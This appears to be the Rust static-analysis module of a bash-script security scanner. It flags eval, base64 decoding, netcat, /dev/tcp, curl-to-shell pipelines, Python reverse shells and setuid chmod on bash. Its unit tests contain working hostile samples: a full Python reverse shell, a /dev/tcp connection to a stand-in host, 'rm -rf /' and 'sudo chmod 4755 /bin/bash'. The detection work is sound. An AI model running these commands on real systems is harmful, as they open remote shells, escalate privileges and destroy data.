use once_cell::sync::Lazy;
use streaming_iterator::StreamingIterator;
use tree_sitter::{Language, Node, Parser, Query, QueryCursor};

use crate::error::BashtionError;
pub mod queries;
use crate::static_analysis::queries::DANGEROUS_COMMAND;

static BASH_LANGUAGE: Lazy<Language> = Lazy::new(|| tree_sitter_bash::LANGUAGE.into());
static DANGEROUS_COMMAND_QUERY: Lazy<Query> =
    Lazy::new(|| Query::new(&BASH_LANGUAGE, DANGEROUS_COMMAND).expect("valid query"));

#[derive(Debug, PartialEq, Eq)]
pub struct StaticFinding {
    pub rule: &'static str,
    pub detail: String,
    pub severity: Severity,
    pub snippet: Option<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Severity {
    Block,
    Caution,
}

type RuleFn = fn(&str, Node) -> Result<Vec<StaticFinding>, BashtionError>;

pub fn analyze(script: &str) -> Result<Vec<StaticFinding>, BashtionError> {
    let mut parser = Parser::new();
    parser
        .set_language(&BASH_LANGUAGE)
        .map_err(|e| BashtionError::Other(format!("Failed to load bash grammar: {e}")))?;

    let tree = parser
        .parse(script, None)
        .ok_or_else(|| BashtionError::Other("Failed to parse script".into()))?;

    let rules: &[RuleFn] = &[
        rule_dangerous_commands,
        rule_dev_tcp,
        rule_pipeline_curl_shell,
        rule_python_reverse_shell,
        rule_sudo_chmod_setuid_shell,
    ];

    let mut findings = Vec::new();
    for rule in rules {
        findings.extend(rule(script, tree.root_node())?);
    }

    Ok(findings)
}

fn rule_dangerous_commands(script: &str, root: Node) -> Result<Vec<StaticFinding>, BashtionError> {
    let mut cursor = QueryCursor::new();
    let cmd_name_idx = DANGEROUS_COMMAND_QUERY
        .capture_index_for_name("cmd_name")
        .ok_or_else(|| BashtionError::Other("Query missing cmd_name capture".into()))?;
    let dangerous_cmd_idx = DANGEROUS_COMMAND_QUERY
        .capture_index_for_name("dangerous_command")
        .ok_or_else(|| BashtionError::Other("Query missing dangerous_command capture".into()))?;

    let mut matches = cursor.matches(&DANGEROUS_COMMAND_QUERY, root, script.as_bytes());
    let mut findings = Vec::new();
    while let Some(m) = matches.next() {
        let mut command_node: Option<Node> = None;
        let mut name_text: Option<String> = None;
        for capture in m.captures.iter() {
            if capture.index == cmd_name_idx {
                name_text = Some(node_text(capture.node, script));
            }
            if capture.index == dangerous_cmd_idx {
                command_node = Some(capture.node);
            }
        }

        let name = match name_text {
            Some(n) => n,
            None => continue,
        };

        let command = match command_node {
            Some(n) => n,
            None => continue,
        };

        let args = collect_arguments(command, script);

        if name == "eval" {
            findings.push(StaticFinding {
                rule: "eval",
                detail: "Dynamic execution via eval".to_string(),
                severity: Severity::Block,
                snippet: Some(node_text(command, script)),
            });
            continue;
        }

        if name == "base64" && has_flag_any(&args, &["-d", "--decode"]) {
            findings.push(StaticFinding {
                rule: "base64_decode",
                detail: "Obfuscation via base64 decode".to_string(),
                severity: Severity::Block,
                snippet: Some(node_text(command, script)),
            });
            continue;
        }

        if name == "openssl" {
            let has_enc = args.iter().any(|a| a == "enc");
            if has_enc && has_flag_any(&args, &["-d", "--decode"]) {
                findings.push(StaticFinding {
                    rule: "openssl_decode",
                    detail: "Obfuscation via openssl enc -d".to_string(),
                    severity: Severity::Block,
                    snippet: Some(node_text(command, script)),
                });
                continue;
            }
        }

        if matches!(name.as_str(), "nc" | "netcat" | "telnet") {
            findings.push(StaticFinding {
                rule: "netcat_like",
                detail: format!("Network backdoor tool detected: {name}"),
                severity: Severity::Block,
                snippet: Some(node_text(command, script)),
            });
            continue;
        }

        if name == "rm" {
            let destructive_flag = args.iter().any(|a| a == "-rf" || a == "-fr");
            let targeting_root = args.iter().any(|a| a == "/");
            if destructive_flag && targeting_root {
                findings.push(StaticFinding {
                    rule: "rm_root",
                    detail: "Destructive command 'rm -rf /'".to_string(),
                    severity: Severity::Block,
                    snippet: Some(node_text(command, script)),
                });
            }
        }
    }

    Ok(findings)
}

fn rule_dev_tcp(script: &str, root: Node) -> Result<Vec<StaticFinding>, BashtionError> {
    let mut findings = Vec::new();
    let mut stack = vec![root];
    while let Some(node) = stack.pop() {
        let kind = node.kind();
        if kind == "comment" || kind == "string" {
            continue;
        }

        if kind == "word" {
            let text = node_text(node, script);
            if text.contains("/dev/tcp/") {
                findings.push(StaticFinding {
                    rule: "dev_tcp",
                    detail: "Network backdoor via /dev/tcp detected".to_string(),
                    severity: Severity::Block,
                    snippet: Some(text),
                });
            }
        }

        let mut cursor = node.walk();
        for child in node.named_children(&mut cursor) {
            stack.push(child);
        }
    }

    Ok(findings)
}

fn rule_pipeline_curl_shell(script: &str, root: Node) -> Result<Vec<StaticFinding>, BashtionError> {
    let mut findings = Vec::new();
    let mut stack = vec![root];
    while let Some(node) = stack.pop() {
        let kind = node.kind();
        if kind == "comment" || kind == "string" {
            continue;
        }

        if kind == "pipeline" && pipeline_curl_to_shell(node, script) {
            findings.push(StaticFinding {
                rule: "curl_pipeline",
                detail: "curl|wget piped to bash/sh".to_string(),
                severity: Severity::Caution,
                snippet: Some(node_text(node, script)),
            });
        }

        let mut cursor = node.walk();
        for child in node.named_children(&mut cursor) {
            stack.push(child);
        }
    }

    Ok(findings)
}

fn rule_python_reverse_shell(
    script: &str,
    root: Node,
) -> Result<Vec<StaticFinding>, BashtionError> {
    let mut findings = Vec::new();
    let mut stack = vec![root];
    while let Some(node) = stack.pop() {
        let kind = node.kind();
        if kind == "comment" || kind == "string" {
            continue;
        }

        if kind == "command" {
            if let Some(reason) = command_python_reverse_shell(node, script) {
                findings.push(reason);
            }
        }

        let mut cursor = node.walk();
        for child in node.named_children(&mut cursor) {
            stack.push(child);
        }
    }
    Ok(findings)
}

fn rule_sudo_chmod_setuid_shell(
    script: &str,
    root: Node,
) -> Result<Vec<StaticFinding>, BashtionError> {
    let mut findings = Vec::new();
    let mut stack = vec![root];
    while let Some(node) = stack.pop() {
        let kind = node.kind();
        if kind == "comment" || kind == "string" {
            continue;
        }

        if kind == "command" {
            if let Some(reason) = command_sudo_chmod(node, script) {
                findings.push(reason);
            }
        }

        let mut cursor = node.walk();
        for child in node.named_children(&mut cursor) {
            stack.push(child);
        }
    }
    Ok(findings)
}

fn pipeline_curl_to_shell(node: Node, script: &str) -> bool {
    let mut cursor = node.walk();
    let commands: Vec<Node> = node
        .named_children(&mut cursor)
        .filter(|n| n.kind() == "command")
        .collect();
    if commands.len() < 2 {
        return false;
    }
    let first = get_command_name(commands.first().unwrap(), script);
    let last = get_command_name(commands.last().unwrap(), script);
    matches!(first.as_deref(), Some("curl") | Some("wget"))
        && matches!(last.as_deref(), Some("bash") | Some("sh"))
}

fn command_python_reverse_shell(command: Node, script: &str) -> Option<StaticFinding> {
    let name = get_command_name(&command, script)?;
    if !matches!(name.as_str(), "python" | "python3") {
        return None;
    }
    let args = collect_arguments(command, script);
    if is_python_reverse_shell(&args) {
        return Some(StaticFinding {
            rule: "python_reverse_shell",
            detail: "Python reverse shell detected".to_string(),
            severity: Severity::Block,
            snippet: Some(node_text(command, script)),
        });
    }
    None
}

fn command_sudo_chmod(command: Node, script: &str) -> Option<StaticFinding> {
    let name = get_command_name(&command, script)?;
    if name != "sudo" {
        return None;
    }
    let args = collect_arguments(command, script);
    if is_sudo_chmod_priv_escalation(&args) {
        return Some(StaticFinding {
            rule: "sudo_chmod_setuid",
            detail: "Priv-escalation via sudo chmod on shell".to_string(),
            severity: Severity::Block,
            snippet: Some(node_text(command, script)),
        });
    }
    None
}

fn is_python_reverse_shell(args: &[String]) -> bool {
    let mut iter = args.iter().peekable();
    while let Some(arg) = iter.next() {
        if arg == "-c" {
            if let Some(payload) = iter.peek() {
                if payload_contains_reverse_shell(payload) {
                    return true;
                }
            }
        } else if let Some(stripped) = arg.strip_prefix("-c") {
            if payload_contains_reverse_shell(stripped) {
                return true;
            }
        }
    }
    false
}

fn payload_contains_reverse_shell(payload: &str) -> bool {
    payload.contains("socket")
        && payload.contains("connect(")
        && (payload.contains("subprocess") || payload.contains("os.dup2"))
}

fn is_sudo_chmod_priv_escalation(args: &[String]) -> bool {
    if args.len() < 3 {
        return false;
    }
    if args[0] != "chmod" {
        return false;
    }
    let mode = &args[1];
    let target = &args[2];
    let suspicious_mode = mode.starts_with('4') && mode.len() == 4;
    let target_shell = target.contains("/bin/bash") || target.contains("/bin/sh");
    suspicious_mode && target_shell
}

fn get_command_name(command: &Node, script: &str) -> Option<String> {
    let mut cursor = command.walk();
    for child in command.children_by_field_name("name", &mut cursor) {
        return Some(node_text(child, script));
    }
    None
}

fn collect_arguments(command: Node, script: &str) -> Vec<String> {
    let mut cursor = command.walk();
    let mut args = Vec::new();
    for arg in command.children_by_field_name("argument", &mut cursor) {
        args.push(node_text(arg, script));
    }
    args
}

fn has_flag_any(args: &[String], flags: &[&str]) -> bool {
    args.iter()
        .any(|a| flags.iter().any(|flag| a == flag || a.starts_with(flag)))
}

fn node_text(node: Node, script: &str) -> String {
    let byte_range = node.byte_range();
    script
        .as_bytes()
        .get(byte_range)
        .map(|b| String::from_utf8_lossy(b).to_string())
        .unwrap_or_default()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn flag_detection_helper() {
        assert!(has_flag_any(&vec!["-d".into()], &["-d", "--decode"]));
        assert!(has_flag_any(&vec!["--decode".into()], &["-d", "--decode"]));
        assert!(!has_flag_any(&vec!["-x".into()], &["-d", "--decode"]));
    }

    fn run_static(script: &str) -> Vec<StaticFinding> {
        analyze(script).unwrap()
    }

    #[test]
    fn static_flags_eval() {
        let results = run_static("eval ls");
        assert!(results.iter().any(|f| f.rule == "eval"));
    }

    #[test]
    fn static_flags_base64_decode() {
        let results = run_static("base64 -d something");
        assert!(results.iter().any(|f| f.rule == "base64_decode"));
    }

    #[test]
    fn static_allows_base64_encode() {
        let results = run_static("echo test | base64");
        assert!(results.is_empty());
    }

    #[test]
    fn static_flags_rm_root() {
        let results = run_static("rm -rf /");
        assert!(results.iter().any(|f| f.rule == "rm_root"));
    }

    #[test]
    fn static_flags_dev_tcp() {
        let results = run_static("exec 5<>/dev/tcp/evil/1337");
        assert!(results.iter().any(|f| f.rule == "dev_tcp"));
    }

    #[test]
    fn static_flags_pipeline_curl_shell() {
        let results = run_static("curl http://x | bash");
        assert!(results.iter().any(|f| f.rule == "curl_pipeline"));
    }

    #[test]
    fn static_flags_python_reverse_shell() {
        let script = r#"python -c "import socket,os,subprocess;s=socket.socket();s.connect(('1.2.3.4',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);subprocess.call(['sh','-i'])""#;
        let results = run_static(script);
        assert!(results.iter().any(|f| f.rule == "python_reverse_shell"));
    }

    #[test]
    fn static_flags_sudo_chmod_setuid() {
        let script = "sudo chmod 4755 /bin/bash";
        let results = run_static(script);
        assert!(results.iter().any(|f| f.rule == "sudo_chmod_setuid"));
    }
}
